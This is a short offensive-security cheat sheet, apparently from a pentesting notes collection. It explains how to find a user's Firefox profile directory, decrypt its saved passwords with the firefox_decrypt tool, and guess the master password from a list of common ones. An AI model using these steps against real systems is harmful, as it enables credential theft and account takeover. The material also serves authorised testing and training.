# FireFox Credentials Dumping

The `.mozilla` directory contains a firefox directory that stores credentials.\
We may dump the credentials and escalate privilege using them.

### Investigation <a href="#investigation" id="investigation"></a>

If there is a `.mozilla/firefox` directory in some user's home directory, we can dump credentials. So check this directory:

```
ls -al /home/<user>/.mozilla/
```

### Dump Passwords from Firefox Profile <a href="#dump-passwords-from-firefox-profile" id="dump-passwords-from-firefox-profile"></a>

To crack it, use [firefox\_decrypt](https://github.com/unode/firefox_decrypt):

```
python3 firefox_decrypt.py .mozilla/firefox/<id>
```

If we’ll be asked the master password and we don’t know it, try common passwords.

```
admin
password
password1
password123
root
```
